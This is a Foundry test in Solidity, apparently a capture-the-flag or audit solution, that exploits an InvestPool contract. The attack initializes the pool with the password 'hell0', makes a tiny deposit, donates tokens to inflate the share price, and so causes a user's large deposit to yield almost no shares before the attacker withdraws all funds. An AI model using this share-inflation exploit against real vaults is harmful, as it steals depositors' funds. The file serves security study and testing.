// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/PoolToken.sol";
import "../src/InvestPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = PoolToken(deployCode("src/PoolToken.sol:PoolToken"));
        pool = InvestPool(
            deployCode(
                "src/InvestPool.sol:InvestPool",
                abi.encode(address(token))
            )
        );

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.prank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hackPool() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
        pool.initialize("hell0");
        vm.startPrank(hacker);
        pool.deposit(1e18);
        vm.stopPrank();
        console.log("total shares : " , pool.totalShares());
        console.log("balance of hacker : ", pool.balance(hacker));

        vm.prank(hacker);
        token.transfer(address(pool), 500e18);
        console.log("token balance : ", token.balanceOf(address(pool)));
        console.log("total shares : " , pool.totalShares());

        userDeposit(1000e18);
        console.log("token balance : ", token.balanceOf(address(pool)));
        console.log("total shares : " , pool.totalShares());
        console.log("user balance :", pool.balance(user));

        vm.prank(hacker);
        pool.withdrawAll();
        console.log("hacker balance : " , token.balanceOf(hacker));

        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}
